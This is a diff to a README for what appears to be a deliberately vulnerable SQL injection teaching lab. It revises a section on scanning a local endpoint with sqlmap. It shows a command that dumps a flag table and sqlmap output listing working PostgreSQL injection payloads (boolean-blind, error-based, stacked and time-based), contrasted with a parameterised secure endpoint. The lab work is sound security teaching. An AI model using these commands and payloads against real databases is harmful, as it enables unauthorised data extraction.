@@ -111,51 +111,49 @@ difference.
 
 DAST needs [sqlmap](https://sqlmap.org) (not a project dependency — install it
 once with `pipx install sqlmap`, `pip install sqlmap`, or your distro package).
-Boot the lab (`docker compose up`, or the SQLite dev loop), then point sqlmap at
-the vulnerable endpoint. A naive run is misleading: `?q=1 --batch` finds a UNION
-point, then discards it as a *"false positive"* and reports the parameter not
-injectable (see [`scans/sqlmap-default-bail.txt`](scans/sqlmap-default-bail.txt)).
-The app *is* vulnerable — sqlmap's default effort level is simply too conservative
-for this endpoint (the parameter is wrapped in `LIKE '%...%'`, the view reflects
-the term, and malformed probes return HTTP 500). sqlmap tells you the fix itself:
-*"Try to increase values for '--level'/'--risk'."* Do that — nothing else changes,
-same `?q=1` — and it confirms the injection three ways and dumps the flag table
-the search should never reach:
+Boot the lab (`docker compose up`), then point sqlmap at the vulnerable endpoint.
+No raised effort is needed: at its **default** `--level=1 --risk=1`, sqlmap
+fingerprints the back-end as PostgreSQL, confirms `?q=1` injectable four ways, and
+dumps the flag table the search should never reach:
 
 ```bash
 sqlmap -u 'http://127.0.0.1:8000/sql-injection/vulnerable/?q=1' \
-       -p q --batch --level=5 --risk=3 --dump -T sqli_flag
+       -p q --batch --dump -T sqli_flag
 ```
 
 ```
 Parameter: q (GET)
     Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
-    Payload: q=1' OR NOT 6636=6636-- dRbP
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: q=1' AND (SELECT (CASE WHEN (1267=1267) THEN NULL ELSE CAST((CHR(89)||CHR(69)||CHR(100)||CHR(107)) AS NUMERIC) END)) IS NULL-- iJxI
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: q=1' AND 7677=CAST(...(SELECT (CASE WHEN (7677=7677) THEN 1 ELSE 0 END))::text... AS NUMERIC)-- XUkB
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: q=1';SELECT PG_SLEEP(5)--
 
     Type: time-based blind
-    Title: SQLite > 2.0 OR time-based blind (heavy query)
-    Payload: q=1' OR 3313=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(...))))-- Verv
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: q=1' UNION ALL SELECT NULL,CHAR(...),NULL-- Snen
-back-end DBMS: SQLite
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: q=1' AND 4539=(SELECT 4539 FROM PG_SLEEP(5))-- hnyv
+back-end DBMS: PostgreSQL
 Table: sqli_flag
 [1 entry]
 +----+--------------------------------------------------+
 | id | value                                            |
 +----+--------------------------------------------------+
-| 4  | FLAG{sql_injection_via_raw_string_interpolation} |
+| 1  | FLAG{sql_injection_via_raw_string_interpolation} |
 +----+--------------------------------------------------+
 ```
 
-At the **same** `--level=5 --risk=3` settings, `/sql-injection/secure/` reports
-*"all tested parameters do not appear to be injectable"* — the ORM's
-parameterisation gives sqlmap nothing to work with. One honest note from the run:
-the raw-SQL view returns HTTP 500 on sqlmap's malformed probes (unbalanced quotes
-become database syntax errors), which sqlmap logs — a realistic sign of a view
-executing attacker-shaped SQL. Full output:
+The **same** command against `/sql-injection/secure/` reports *"all tested
+parameters do not appear to be injectable"* — the ORM's parameterisation gives
+sqlmap nothing to work with. One honest note from the run: the raw-SQL view
+returns HTTP 500 on sqlmap's malformed probes (unbalanced quotes become database
+syntax errors), which sqlmap logs — a realistic sign of a view executing
+attacker-shaped SQL. Full output:
 [`scans/sqlmap-vulnerable.txt`](scans/sqlmap-vulnerable.txt),
 [`scans/sqlmap-secure.txt`](scans/sqlmap-secure.txt).
 
